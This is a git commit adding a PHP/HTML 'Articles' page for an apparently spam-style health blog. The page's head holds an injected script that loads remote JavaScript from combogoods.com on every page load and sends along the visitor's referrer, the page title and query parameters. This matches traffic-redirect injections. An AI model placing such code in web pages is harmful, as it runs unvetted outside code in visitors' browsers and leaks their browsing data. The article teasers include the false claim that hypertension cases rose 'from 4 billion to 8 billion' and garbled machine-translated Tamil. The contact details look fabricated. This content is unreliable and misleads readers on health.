0755d38d0225bca1469e111b2031a5cc9808870a
kamazgovna <83076680+kamazgovna@users.noreply.github.com>
2021-04-23 18:02:04 +0300

    1
    1

---
+++ blog.php
@@ -0,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+
+    
+
+    <title>Articles</title>
+
+
+    <meta charset="UTF-8">
+
+    <!-- Favicon -->
+
+
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css?family=Josefin+Sans:300,300i,400,400i,700,700i" rel="stylesheet">
+
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="css/flaticon.css"/>
+    <link rel="stylesheet" href="css/slicknav.min.css"/>
+    <link rel="stylesheet" href="css/jquery-ui.min.css"/>
+    <link rel="stylesheet" href="css/owl.carousel.min.css"/>
+    <link rel="stylesheet" href="css/animate.css"/>
+    <link rel="stylesheet" href="css/style.css"/>
+
+
+    <!--[if lt IE 9]>
+
+    <![endif]-->
+
+<span id="0eeac24d-c7ec-8d74-81cd-b2e9e1478448"></span><script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='//combogoods.com/vV7J2F?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm6082c9a27748c=script6082c9a27748d&_cid=0eeac24d-c7ec-8d74-81cd-b2e9e1478448'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+if (document.location.protocol === 'https:' && '//combogoods.com/vV7J2F?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm6082c9a27748c=script6082c9a27748d'.indexOf('http:') === 0 ) {alert('The website works on HTTPS. The tracker must use HTTPS too.');}
+</script></head>
+<body>
+<!-- Page Preloder -->
+
+
+<!-- Header section -->
+<header class="header-section">
+    <div class="header-top">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-2 text-center text-lg-left">
+                    <!-- logo -->
+                    <a href="index.php" class="site-logo">
+                        body
+                    </a>
+                </div>
+                <div class="col-xl-6 col-lg-5">
+                    <form class="header-search-form">
+                        <input type="text">
+                        <button><i class="flaticon-search"></i></button>
+                    </form>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    <nav class="main-navbar">
+        <div class="container">
+            <!-- menu -->
+            <ul class="main-menu">
+                <li><a href="index.php">Main</a></li>
+                <li><a href="blog.php">Articles</a></li>
+                <li><a href="terms.php">Terms and conditions</a></li>
+                <li><a href="policy.php">Privacy policy</a></li>
+                <li><a href="contact.php">Contacts</a></li>
+            </ul>
+        </div>
+    </nav>
+</header>
+<!-- Header section end -->
+
+
+<!-- Hero section -->
+
+<!-- Hero section end -->
+
+
+<!-- Features section -->
+
+<!-- Features section end -->
+
+
+<!-- letest product section -->
+
+<!-- letest product section end -->
+
+
+<!-- Product filter section -->
+<section class="product-filter-section">
+    <div class="container">
+        <div class="section-title pt-5">
+            <h2>Articles</h2>
+        </div>
+
+        <div class="row justify-content-center">
+            <div class="col-lg-8">
+                
+                <div class="product-item mb-5">
+                    <div class="card">
+                        <img
+                                src="./assets/images/7811f310407f659a6455cb717e9d4e7c.jpg"
+                                class="card-img-top"
+                                alt=""
+                        />
+                        <div class="card-body">
+                            <a href="IGW1BDOaB2CDmDNm29sYd.php"><h5 class="card-title">ஏன் காஃபின் ஏற்படும் வயிற்று வலி?</h5></a>
+                            <p class="card-text">
+                                 ஏன் காஃபின் காரணம் stomachaches? காஃபின் ஒரு neuromodulator பாதிக்கிறது என்று மயக்கத்தில் ம...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                
+
+                <div class="product-item mb-5">
+                    <div class="card">
+                        <img
+                                src="./assets/images/simon-rae-igobsr93i7y-unsplash.jpg"
+                                class="card-img-top"
+                                alt=""
+                        />
+                        <div class="card-body">
+                            <a href="5957160349ba06963c94c8ca3178bad6.php"><h5 class="card-title">The main causes of high blood pressure</h5></a>
+                            <p class="card-text">
+                                   Hypertension is a disease of the 21st century. It is considered to be a common scourge of modern times. The number of people with hypertension has increased from 4 billion to 8 billion since World ...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                
+
+                <div class="product-item mb-5">
+                    <div class="card">
+                        <img
+                                src="./assets/images/jonny-swales-tz8qmb5gfj0-unsplash.jpg"
+                                class="card-img-top"
+                                alt=""
+                        />
+                        <div class="card-body">
+                            <a href="c85a4c55d042a2d73b9258c0cdb874ce.php"><h5 class="card-title">How to lose weight fast?</h5></a>
+                            <p class="card-text">
+                                   Drastically reducing the size of the body and all its organs is the mission of many overweight people. In this mission, many mistakes are made that contribute to the appearance of fat around the wa...
+                            </p>
+                        </div>
+                    </div>
+                </div>
+                
+
+            </div>
+
+        </div>
+
+    </div>
+</section>
+<!-- Product filter section end -->
+
+
+<section class="contact-section">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-6 contact-info">
+                <h3>Contacts</h3>
+                <p>631 Bechtelar Station Apt. 600
+Chadborough, SD 67723</p>
+                <p>+1950966918820</p>
+                <p>lelia.wolf@hotmail.com</p>
+
+                <form method="post" action="thanks.php" class="contact-form">
+                    <input type="text" placeholder="Name">
+                    <input type="text" placeholder="Email">
+                    <input type="text" placeholder="Phone number">
+
+                    <textarea></textarea>
+                    <label class="terms-label">
+                        <input style="width: 30px!important;" type="checkbox" name="terms" value="check"
+                               required="required">
+                        <a href="policy.php" target="_blank">
+                            I have read and agree to the terms of the user agreement
+                        </a>
+                    </label>
+                    <button class="site-btn">Send</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+</section>
+
+
+<!-- Footer section -->
+<section style="margin-top: 130px" class="footer-section">
+
+
+    <p class="text-white text-center mt-5">Copyright &copy;<script>document.write(new Date().getFullYear());</script>
+        All rights reserved
+    </p>
+
+
+</section>
+<!-- Footer section end -->
+<div class='cookie-banner'>
+    <p>
+        The site uses cookies. They allow us to recognize you and get information about your user experience.By continuing to browse the site, I agree to the use of cookies by the site owner in accordance with  <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie">Cookie policy</a>
+    </p>
+    <button class='close-cookie'>&times;</button>
+</div>
+
+
+<!--====== Javascripts & Jquery ======-->
+<script src="js/jquery-3.2.1.min.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="js/jquery.slicknav.min.js"></script>
+<script src="js/owl.carousel.min.js"></script>
+<script src="js/jquery.nicescroll.min.js"></script>
+<script src="js/jquery.zoom.min.js"></script>
+<script src="js/jquery-ui.min.js"></script>
+<script src="js/main.js"></script>
+<script>
+    window.onload = function () {
+        $('.close-cookie').click(function () {
+            $('.cookie-banner').fadeOut();
+        })
+    }
+</script>
+<script>
+    let elems = document.querySelectorAll('.server-name');
+    elems.forEach((elem) => {
+        elem.innerHTML = window.location.hostname
+    })
+</script>
+</body>
+</html>
